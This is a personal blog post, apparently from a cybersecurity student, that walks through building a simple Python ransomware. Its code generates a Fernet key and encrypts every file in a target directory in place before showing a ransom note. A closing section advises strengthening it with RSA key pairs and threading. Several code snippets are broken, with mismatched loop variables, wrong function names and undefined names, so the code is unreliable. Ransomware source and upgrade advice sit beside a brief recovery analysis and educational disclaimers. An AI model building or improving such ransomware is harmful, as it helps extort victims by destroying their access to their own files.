<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <title>
  Malware creation and analysis · xKayniT
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="xKayniT">
<meta name="description" content="Create and understand how to reverse a simple malware">
<meta name="keywords" content="blog,developer,cybersecurity">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Malware creation and analysis">
  <meta name="twitter:description" content="Create and understand how to reverse a simple malware">

<meta property="og:url" content="http://localhost:1313/posts/malware_creation_analysis/">
  <meta property="og:site_name" content="xKayniT">
  <meta property="og:title" content="Malware creation and analysis">
  <meta property="og:description" content="Create and understand how to reverse a simple malware">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-11-06T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-11-06T00:00:00+00:00">
    <meta property="article:tag" content="Xkaynit">
    <meta property="article:tag" content="Post">
    <meta property="article:tag" content="Malware">




<link rel="canonical" href="http://localhost:1313/posts/malware_creation_analysis/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/linuxprofil.jpg" sizes="any">
<link rel="icon" type="image/png" href="/images/linuxprofil.jpg" sizes="32x32">
<link rel="icon" type="image/png" href="/images/linuxprofil.jpg" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/">
      xKayniT
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Posts</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="http://localhost:1313/posts/malware_creation_analysis/">
              Malware creation and analysis
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2024-11-06T00:00:00Z">
                November 6, 2024
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              4-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="/authors/xkaynit/">Xkaynit</a></div>

          
          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="/tags/xkaynit/">Xkaynit</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/post/">Post</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/malware/">Malware</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <h1 id="create-and-understand-how-to-reverse-a-simple-malware">
  Create and understand how to reverse a simple malware
  <a class="heading-link" href="#create-and-understand-how-to-reverse-a-simple-malware">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<h2 id="introduction">
  Introduction
  <a class="heading-link" href="#introduction">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The purpose of this article is to create a simple malware(ransomware), understand how it is possible to reverse it(when it&rsquo;s possible) and see some ways to improve the malware. This is what I saw in one of my courses last year and I really want to did an article about this topic because this is related to one of some current threat in cybersecurity. A <strong>malware</strong> refers to any intrusive software developed by malicious attackers to steal data and damage or destroy computers.</p>
<p><em><strong>If you want to reproduce the malware, please do it for educational purpose only and in a virtual machine to prevent any damages. I am not responsible of your actions with using the following code.</strong></em></p>
<h2 id="malware-creation">
  Malware creation
  <a class="heading-link" href="#malware-creation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>In this part I am going to analyse the main part of the malware, you can assemble all the code to retrieve the entire file. Firstly, we need to create a directory with a text file and the sentence of your choice in it which is the one we will take as example.</p>
<pre tabindex="0"><code>from cryptography.fernet import Fernet

def key_gen():
    clef=Fernet.generate_key()
    with open(&#34;clef.key&#34;,&#39;wb&#39;) as key_file:
        key_file.write(clef)
</code></pre><p>Fernet library and more precisely <strong>cryptography</strong> class permit us to use symmetric encryption. This type of encryption means that we need the key to both encrypt and decrypt the text. Anyone who doesn&rsquo;t have access to the key can&rsquo;t decrypt the message. The code above use <strong>generate_key</strong> function to as indicate in the name generate our key and write it in <strong>clef.key</strong> file(write-binary opening mode). If the key is lose or stolen by malicious attacker, the message can&rsquo;t be decrypt in the first case and the stealer can read the encrypt message in the second.</p>
<pre tabindex="0"><code>def key_loading():
    return open(&#39;clef.key&#39;,&#39;rb&#39;).read()
</code></pre><p>This function opened the previously created file and load the key inside to use it in the encryption file of the directory.</p>
<pre tabindex="0"><code>def encrypt_all(items,clef):
    f=Fernet(clef)
    for items in items:
        with open(item,&#39;rb&#39;) as File:
            file_data=File.read()
        encrypted_data=f.encrypt(file_data)
        with open(item,&#39;wb&#39;) as File:
            File.write(encrypted_data)
</code></pre><p>This is the most important function in the code. The purpose of it is to encrypt all the data file in the targeted repository. Fernet function create an instance with the key, this instance allow to encrypt the data as seen in the <strong>encrypted_data</strong> line. After, we load all the file in the repository with the first &ldquo;with&rdquo; loop and encrypt the loaded data file with the second.</p>
<pre tabindex="0"><code>path=[&#39;confidential&#39; + &#39;/&#39; + item for item in items]
key_generation()
clef=key_loading()
encrypt_all(path,clef)
money()
</code></pre><p>Money function is define to make the ransomware more realist with some instructions inside, for example a ransom demand.
To conclude this part, we choose the target path in the variable <strong>path</strong>(here the path is &ldquo;confidential&rdquo;), we generate the key and load it in <strong>clef</strong> file. Finally, the encrypt_all function is used with the path and the previously loaded key parameters.</p>
<h2 id="analysis">
  Analysis
  <a class="heading-link" href="#analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>By executing the python code, the &lsquo;confidential&rsquo; directory is completely unreadable and data can be lose. A file containing instructions to retrieve the decipher key has been created with &ldquo;ransom payment&rdquo;. But the code and more precisely key file have some vulnerabilities. The first major is the symmetrical cryptography, this means you have one key to both cipher and decipher the files. This is why symmetric cipher is not currently used nowadays, if someone find the symmetrical key, he may decipher the content of the directory.<br>
Another point to notice is the storage location of the key. Indeed, the key is stored on the computer so the user can retrieve it and use it to decipher the targeted directory.</p>
<h2 id="improvement">
  Improvement
  <a class="heading-link" href="#improvement">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Some easy improvements are possible to have a stronger ransomware. Concerning the encryption key used, it is better to use an asymmetrical encrpytion protocol with a public/private key pair in order to have one for cipher(public) and the other for decipher(private). An algorithm such as RSA will well works for this purpose. This improvement act to hide the storage location of the key too because we only need to have the public key to cipher and keep the private key in a &ldquo;safe place&rdquo;. Another point to take into account is the performance of the ransomware. The current code is not very efficiency with a lot of directory and files, it is possible to increase the overall performance with using python threading. Threading allow us to browse all files concurrently in a way to reduce the execution time when a lot of files is contained in the targeted directory.</p>
<h2 id="conclusion">
  Conclusion
  <a class="heading-link" href="#conclusion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>In this article we saw what is a malware and more precisely a ransomware, the step to construct it and the works of each parts. The last two parts talks about analysis and possible improvements of the malware. <em><strong>Once time again, this article is on an educational purpose only so please if you want to reproduce it be sure to execute it on a controlled environnement.</strong></em></p>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2024 -
    
    2025
     xKayniT 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
